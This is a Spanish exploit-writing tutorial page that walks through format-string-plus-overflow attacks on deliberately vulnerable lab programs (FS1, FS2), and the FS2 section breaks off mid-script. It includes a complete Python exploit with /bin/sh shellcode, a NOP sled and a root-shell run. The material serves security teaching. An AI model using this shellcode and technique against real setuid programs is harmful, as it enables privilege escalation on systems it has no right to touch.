<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">GNU GPL</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-format-string">Ataque Format String</h1>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="fs-1">Fs 1</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">short</span> <span class="kt">int</span> <span class="n">zero</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
	<span class="kt">int</span> <span class="o">*</span><span class="n">plen</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%s%hn</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">plen</span><span class="p">);</span>
	<span class="k">while</span><span class="p">(</span><span class="n">zero</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>El programa vulnerable copia en <code class="highlighter-rouge">buf</code> el primer parámetro ingresado por el usuario. Imprime por salida estándar el contenido de <code class="highlighter-rouge">buf</code> y guarda en <code class="highlighter-rouge">plen</code> la cantidad de bytes impresos. Si la variable <code class="highlighter-rouge">zero</code> se mantiene intacta el loop <code class="highlighter-rouge">while(zero)</code> no se ejecuta y el proceso finaliza.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>gcc <span class="nt">-m32</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-ggdb</span> <span class="nt">-mpreferred-stack-boundary</span><span class="o">=</span>2 <span class="nt">-z</span> execstack <span class="nt">-o</span> fs1 fs1.c
user@abos:~<span class="nv">$ </span><span class="nb">sudo chown </span>root ./fs1<span class="p">;</span> <span class="nb">sudo chmod </span>u+s ./fs1                      <span class="p">;</span> root owner &amp; setuid

user@abos:~<span class="nv">$ </span>./fs1 AAAAA
AAAAA
user@abos:~<span class="nv">$ </span>./fs1 BBBBBBB
BBBBBBB
</code></pre></div></div>

<h3 id="cuál-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<ul>
  <li>Si se sigue la estrategia de sobreescribir la dirección de retorno de <code class="highlighter-rouge">main</code>, de manera colateral se pisa el valor de <code class="highlighter-rouge">zero</code> provocando un loop infinito. Frente a esto el proceso nunca retorna y la reescritura de la dirección de retorno en la pila es inútil.</li>
</ul>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs1/escritura-zero.png" alt="pila" /></p>

<ul>
  <li>Es necesario pensar en un ataque combinado de desbordamiento de búfer y el aprovechamiento de una vulnerabilidad del tipo format string.</li>
</ul>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<pre><code class="language-asm">[ebp-264]  = buf
[ebp-8]    = plen
[ebp-4]    = zero
[ebp]      = ebp anterior
[ebp+4]    = dirección de retorno
</code></pre>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs1/layout-pila.png" alt="pila" /></p>

<h2 id="ataque-format-string-1">Ataque Format String:</h2>
<p>La reescritura de la dirección de retorno de <code class="highlighter-rouge">main</code> a través de un desbodamiento de búfer -en la función <code class="highlighter-rouge">strcpy</code>- obliga a sobreescribir la variable <code class="highlighter-rouge">zero</code> (por su ubicación en la pila entre <code class="highlighter-rouge">buf</code> y la dirección de retorno). Para que el ataque funcione es necesario que <code class="highlighter-rouge">main</code> retorne y por ende que <code class="highlighter-rouge">zero</code> continúe siendo 0.</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs1/escritura-zero-2.png" alt="pila" /></p>

<blockquote>
  <p><strong>Consideraciones</strong>: no es plausible como solución sobreescribir <code class="highlighter-rouge">zero</code> con el valor numérico de <code class="highlighter-rouge">0000</code>. Como el desbordamiento de bufer se logra a través <code class="highlighter-rouge">strcpy</code>, una función que manipula strings, si optamos por escribir en <code class="highlighter-rouge">zero</code> el string “0000” estaríamos almacenando en <code class="highlighter-rouge">zero</code> el código ascii: <code class="highlighter-rouge">0x30303030</code>. Y por ende no lograríamos el objetivo de que el programa retorne.</p>
</blockquote>

<p>Para solucionar este escollo es necesario combinar el ataque de desbordamiento de búfer con un ataque del tipo format string.    <br />
Este ataque tomará dos pasos. Primero, aprovechar <code class="highlighter-rouge">strcpy(buf,argc[1])</code> para inyectar el shellcode y sobreescribir la dirección de retorno de <code class="highlighter-rouge">main()</code> almacenada en la pila para que apunte a él. Y en un segundo paso, aprovechamos <code class="highlighter-rouge">printf("%s%hn\n",buf,plen)</code> para volver a <code class="highlighter-rouge">zero = 0</code> de manera indirecta a través de <code class="highlighter-rouge">plen</code>, gracias a una vulnerabilidad del tipo format string. Paso a paso la estrategia será la siguiente:</p>

<p><strong>Primera parte</strong>: aprovechando el código <code class="highlighter-rouge">strcpy(buf,argc[1])</code>:</p>
<ul>
  <li>Inyectamos el shellcode en <code class="highlighter-rouge">buf</code>.</li>
  <li>Con un desbordamiento sobreescribimos <code class="highlighter-rouge">plen</code> para que apunte a <code class="highlighter-rouge">zero</code>.</li>
  <li>Y sobreescribimos la dirección de retorno de <code class="highlighter-rouge">main()</code> para que apunte a <code class="highlighter-rouge">buf</code>.</li>
</ul>

<p><strong>Segunda parte</strong>: aprovechando <code class="highlighter-rouge">printf("%s%hn\n",buf,plen)</code>:</p>
<ul>
  <li>Esta línea de código nos va a permitir escribir un valor arbitrario de no más de dos bytes en <code class="highlighter-rouge">plen</code>.   <br />
<a href="/guia-escritura-exploits/format-string/5-format-string.html#parámetros-de-formato">Como se indicó previamente</a> el parámetro <code class="highlighter-rouge">%n</code> escribe la cantidad de bytes impresos en la dirección especificada. Cuando se lo utiliza como <code class="highlighter-rouge">%hn</code> como en este caso (con una <code class="highlighter-rouge">h</code> de <em>half</em> como formato adicional de longitud) va a escribir la cantidad de caracteres impresos pero en un short de 2 bytes.</li>
  <li>
    <p>Gracias al desbordamiento de búfer previo, <code class="highlighter-rouge">plen</code> apunta a <code class="highlighter-rouge">zero</code>. El primer <code class="highlighter-rouge">%s</code> del format string va a imprimir el string en <code class="highlighter-rouge">buf</code> hasta llegar a un caracter nulo, si logramos que la extensión de ese string sea de 10000 en hexa -como <code class="highlighter-rouge">%hn</code> escribe sólo dos bytes- logramos escribir <code class="highlighter-rouge">0000</code> en <code class="highlighter-rouge">plen</code> (quedando descartado el 1 inicial de (1)0000).    <br />
Entonces como <code class="highlighter-rouge">plen</code> apunta a <code class="highlighter-rouge">zero</code> si manipulamos adecuadamente la extensión de <code class="highlighter-rouge">buf</code> logramos el objetivo de que <code class="highlighter-rouge">zero = 0</code> indirectamente a través de <code class="highlighter-rouge">plen</code>.    <br />
Con ello evitamos el loop infinito del <code class="highlighter-rouge">while(zero)</code> y logramos que <code class="highlighter-rouge">main</code> retorne al código malicioso inyectado en el primer paso.</p>

    <p><img src="/guia-escritura-exploits/format-string/imagenes/fs1/exploit.png" alt="pila" /></p>
  </li>
</ul>

<p>Para lograrlo llevamos a cabo los siguientes pasos.</p>

<ol>
  <li>
    <p>Identificamos la dirección de <code class="highlighter-rouge">buf</code> en <code class="highlighter-rouge">gdb</code></p>

    <blockquote>
      <p><strong>Consideraciones</strong>: como el argumento que le vamos a pasar a <code class="highlighter-rouge">strcpy</code> se almacena en la pila, su longitud afecta el cálculo de la dirección de <code class="highlighter-rouge">buf</code>. En este caso sabemos que la longitud total del argumento (es decir la cantidad de caracteres que va a imprimir <code class="highlighter-rouge">printf</code>) debe ser de <code class="highlighter-rouge">0x(1)0000</code> que en decimal es <code class="highlighter-rouge">65536</code>.    <br />
Por eso para conocer la dirección que tendrá <code class="highlighter-rouge">buf</code> debugeamos el programa con un argumento cualquiera pero de esa longitud.</p>
    </blockquote>

    <p>Armamos un archivo en Python para ingresar el input: <code class="highlighter-rouge">exploit.py</code></p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
   
<span class="n">exploit</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">65536</span>                   <span class="c"># 0x1000 == 65536</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>

    <p>Y ejecutamos el programa vulnerable con ese argumento para conocer la dirección de <code class="highlighter-rouge">buf</code>:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>../r.sh gdb ./fs1
GNU gdb <span class="o">(</span>Debian 7.7.1+dfsg-5<span class="o">)</span> 7.7.1
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>main
<span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">"</span><span class="k">$(</span>./exploit.py<span class="k">)</span><span class="s2">"</span>
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>6
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
   
Breakpoint 2, main <span class="o">(</span><span class="nv">argv</span><span class="o">=</span>3, <span class="nv">argc</span><span class="o">=</span>0xbffff814<span class="o">)</span> at fs1.c:6
6   strcpy<span class="o">(</span>buf,argc[1]<span class="o">)</span><span class="p">;</span>
   
<span class="o">(</span>gdb<span class="o">)</span> x/wx buf
0xbffef680: 0x00000000
</code></pre></div>    </div>
    <p>La dirección de <code class="highlighter-rouge">buf</code> es entonces <code class="highlighter-rouge">0xbffef680</code>.</p>
  </li>
  <li>
    <p>Planificamos el argumento de entrada</p>
    <ul>
      <li>Inyectamos el shellcode en <code class="highlighter-rouge">buf</code>.</li>
      <li>Hacemos que <code class="highlighter-rouge">plen</code> apunte a <code class="highlighter-rouge">zero</code>.</li>
      <li>Escribimos basura en <code class="highlighter-rouge">zero</code> (porque vamos a pisar su valor).</li>
      <li>Incluimos una dirección válida cualquiera en <code class="highlighter-rouge">ebp</code>.</li>
      <li>Sobreescribimos la dirección de retorno para que apunte al shellcode.</li>
      <li>Extendemos longitud del input para imprimir un total de (1)0000 bytes, cantidad almacenada en <code class="highlighter-rouge">plen</code> (que apuntará a <code class="highlighter-rouge">zero</code>).</li>
    </ul>
  </li>
</ol>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs1/exploit.png" alt="pila" /></p>

<ol>
  <li>
    <p>Con eso en mente editamos el archivo en Python con el argumento definitivo: <code class="highlighter-rouge">exploit.py</code></p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="c">#pwn a shell</span>
<span class="n">shellcode</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">"</span>
   
<span class="n">buf_size</span> <span class="o">=</span> <span class="mi">256</span>
   
<span class="n">buf_addr</span>  <span class="o">=</span> <span class="mh">0xbffef680</span>
<span class="n">zero_addr</span> <span class="o">=</span> <span class="n">buf_addr</span> <span class="o">+</span> <span class="n">buf_size</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span>         <span class="c">#addr zero (4 bytes: int plen; 2 bytes: short int zero)</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">80</span>                          <span class="c">#nop sled</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">shellcode</span>                            <span class="c">#shellcode</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">256</span><span class="o">-</span><span class="mi">80</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>     <span class="c">#fill buf</span>
<span class="c">#total: 256 bytes</span>
   
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">zero_addr</span><span class="p">)</span>                <span class="c">#plen -&gt; &amp;zero</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"AAAA"</span>                               <span class="c">#basura en zero</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>                 <span class="c">#basura -addr existente- en ebp</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>                 <span class="c">#ret addr -&gt; &amp;shellcode</span>
<span class="c">#total: 16 bytes</span>

<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">65536</span><span class="o">-</span><span class="mi">256</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span>                 <span class="c">#%hn contabiliza 0x10000 o 65536 bytes (*plen = 0000)</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Ejecutamos el exploit</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>../r.sh ./fs1 <span class="s2">"</span><span class="k">$(</span>./exploit.py<span class="k">)</span><span class="s2">"</span>

BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
<span class="c"># whoami</span>
root
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>
<span class="c"># </span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="layout-de-la-pila-después-del-exploit">Layout de la pila después del exploit:</h3>
<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs1/programa-explotado.png" alt="pila después" /></p>

<p>…………………………………………………………………………………………………………………………………………………</p>
<h2 id="fs2">FS2</h2>

<h3 id="código-fuente">Código fuente</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

        <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span> <span class="n">buf</span><span class="p">,</span><span class="s">"%s%c%c%hn"</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span> <span class="n">buf</span><span class="p">,</span><span class="s">"%s%c%c%hn"</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="qué-hace-el-programa-1">¿Qué hace el programa?</h3>
<p>El programa vulnerable espera dos argumentos de entrada. Copia en <code class="highlighter-rouge">buf</code> el primer argumento ingresado por el usuario. El format string de <code class="highlighter-rouge">snprintf</code> indica que espera un puntero a un string, dos valores del tipo caracter y otro puntero a dónde se va a guardar la cantidad de bytes impresos (número almacenado en dos bytes). Se reiteran estos pasos con el segundo argumento ingresado.</p>

<h3 id="cuál-es-la-dificultad-principal-1">¿Cuál es la dificultad principal?</h3>
<ul>
  <li><code class="highlighter-rouge">snprintf(char *buf, size_t size, const char *format, ...)</code> almacena en la salida (es decir, en <code class="highlighter-rouge">buf</code>) sólo el tamaño indicado por <code class="highlighter-rouge">size</code>.</li>
  <li><code class="highlighter-rouge">%hn</code> como parámetro escribe la cantidad de bytes impresos únicamente en dos bytes. Mientras que la dirección que necesitamos sobreescribir tiene 4 bytes.</li>
</ul>

<h3 id="layout-de-la-pila-antes-del-exploit-1">Layout de la pila antes del exploit:</h3>
<p>Estado de la pila antes de ejecutar el primer <code class="highlighter-rouge">snprintf</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="n">eip</span> <span class="o">=&gt;</span>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span> <span class="n">buf</span><span class="p">,</span><span class="s">"%s%c%c%hn"</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span> <span class="n">buf</span><span class="p">,</span><span class="s">"%s%c%c%hn"</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
     <span class="p">}</span>
</code></pre></div></div>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs2/layout-pila.png" alt="pila-1" /></p>

<p>Con el primer <code class="highlighter-rouge">call</code> a <code class="highlighter-rouge">snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1])</code> se apilan sus parámetros de la siguiente manera:</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs2/layout-pila-snprintf.png" alt="pila-2" /></p>

<p>El gráfico del estado de la pila al hacer el llamado a <code class="highlighter-rouge">snprintf</code> muestra cómo esa función de formato obtiene de la pila los parámetros de formato <code class="highlighter-rouge">"%s%c%c%hn"</code>. ese es el contenido que almacena en <code class="highlighter-rouge">buf</code>.</p>

<h3 id="ataque-format-string-2">Ataque Format String</h3>
<h4 id="particularidad-de-la-función-snprintf">Particularidad de la función <code class="highlighter-rouge">snprintf()</code>:</h4>
<p>La función <code class="highlighter-rouge">snprintf(char *buf, size_t size, const char *format, ...)</code> almacena en <code class="highlighter-rouge">buf</code> sólo el tamaño indicado por <code class="highlighter-rouge">size</code>. En este caso <code class="highlighter-rouge">snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1])</code> escribe en <code class="highlighter-rouge">buf</code> 256 bytes que es el tamaño de <code class="highlighter-rouge">buf</code> que se pasa como parámetro. Independientemente de eso, el parámetro de formato <code class="highlighter-rouge">%hn</code> escribe en una dirección dada <strong>la cantidad total de bytes impresos pudiendo ser mayor que el tamaño de <code class="highlighter-rouge">buf</code></strong>.    <br />
Por ejemplo, si tuviesemos una llamada <code class="highlighter-rouge">snprintf(buf, 256, "%s%n", &amp;txt, &amp;num_caracteres)</code> y sabemos que <code class="highlighter-rouge">len(txt)</code> es 1024. Aunque en buf se copien 256 bytes (el size que se le pasa por parámetro), en <code class="highlighter-rouge">num_caracteres</code> se va a escribir el número 1024, es decir el total de bytes impresos.   <br />
Esto permite aprovecharnos del format string para lograr una escritura arbitraria manipulando la cantidad total de caracteres impresos, sin importar la restricción del tamaño de <code class="highlighter-rouge">buf</code>.</p>

<p>Aprovechando esa peculiaridad vamos a sobreesribir la dirección de retorno de <code class="highlighter-rouge">main</code> almacenada en la pila para que apunte al shellcode.    <br />
Al igual que antes este ataque toma dos partes:</p>

<p><strong>Primera parte</strong>: con <code class="highlighter-rouge">snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1])</code> inyectamos el shellcode en <code class="highlighter-rouge">buf</code> y -manipulando el total de bytes impresos- aprovechamos el parámetro <code class="highlighter-rouge">%hn</code> para sobreescribir los dos primeros bytes de la dirección de retorno de <code class="highlighter-rouge">main</code> con parte de la dirección de <code class="highlighter-rouge">buf</code>.</p>

<p><strong>Segunda parte</strong>: con <code class="highlighter-rouge">snprintf(buf,sizeof buf,"%s%c%c%hn",argc[2])</code> aprovechando también <code class="highlighter-rouge">%hn</code> sobrescribimos los otros dos bytes de la dirección de retorno.</p>

<p>Para lograrlo llevamos a cabo los siguientes pasos.</p>

<ol>
  <li>Planificamos los argumentos de <code class="highlighter-rouge">main()</code>
    <ul>
      <li>Inyectamos el shellcode en <code class="highlighter-rouge">buf</code></li>
      <li>Usamos el parámetro <code class="highlighter-rouge">%hn</code> para sobreescribir en la dirección de retorno de <code class="highlighter-rouge">main</code></li>
      <li>Para ello extendemos la longitud del input para que la cantidad de caracteres impresos por <code class="highlighter-rouge">snprintf</code> sea igual a la dirección de <code class="highlighter-rouge">buf</code>.   <br />
Así logramos sobreescribir la dirección de retorno para que apunte a <code class="highlighter-rouge">buf</code>.</li>
    </ul>

    <p><img src="/guia-escritura-exploits/format-string/imagenes/fs2/planificacion-format-string.png" alt="pila" /></p>

    <blockquote>
      <p><strong>Consideraciones</strong>:   <br />
    - Fallo en tobogán de NOPs: con esta estrategia el tobogán de NOPs que debe desembocar en el shellcode, se detiene erróneamente en la dirección de retorno apilada al comienzo de <code class="highlighter-rouge">buf</code> (en el gŕafico <code class="highlighter-rouge">&amp;ret_addr</code>). Esa dirección de retorno es importante ya que le indica al parámetro <code class="highlighter-rouge">%hn</code> dónde escribir.    <br />
      Es necesaria una modificación para que los primeros bytes de <code class="highlighter-rouge">buf</code> hagan un jump que se saltee esa dirección de retorno y siga por el tobogán de NOPs hasta el shellcode. Para eso se incluye al principio de <code class="highlighter-rouge">buf</code> el código <code class="highlighter-rouge">\xeb\x0a</code> que es el código máquina de la instrucción <code class="highlighter-rouge">jmp 0xc</code>. De manera que al retornar <code class="highlighter-rouge">main</code> se desemboca en <code class="highlighter-rouge">buf</code>, se hace un salto de 12 bytes y se cae en el tobogán de NOPs que finalmente desembocan en el shellcode.</p>
    </blockquote>

    <p>Entonces para incluir el jump que evite el fallo en el tobogán de NOPs, el layout de pila deseado es:</p>

    <p><img src="/guia-escritura-exploits/format-string/imagenes/fs2/modificacion-exploit.png" alt="pila" /></p>
  </li>
  <li>
    <p>Identificamos la dirección de buf   <br />
Para averiguar la dirección de <code class="highlighter-rouge">buf</code> es necesario volver a tener en cuenta la cuestión del padding.
En casos como: <code class="highlighter-rouge">printf("%s",argc[1])</code> al string de entrada se lo pasamos como un argumento y por ende se almacena en la pila. Sumar un byte al final del string modifica los offsets en la pila y complejiza el cálculo de direcciones de memoria.</p>

    <p>Pasando siempre argumentos de igual longitud fijamos los offsets de la pila. Para eso llamamos al programa con un argumento extra que funciona como “padding” y es relativo a la longitud del resto de los argumentos. Así logramos consistencia en las direcciones de memoria sin importar que modifiquemos los bytes de longitud del/los string/s de entrada.   <br />
Creamos el archivo <code class="highlighter-rouge">exploit.py</code> para probar el padding:</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">exploit</span><span class="o">=</span> <span class="s">"BBBB"</span>                   <span class="p">;</span> <span class="n">ac</span><span class="err">á</span> <span class="n">puede</span> <span class="n">ir</span> <span class="n">cualquier</span> <span class="n">cosa</span>
   
<span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100000</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
   
<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
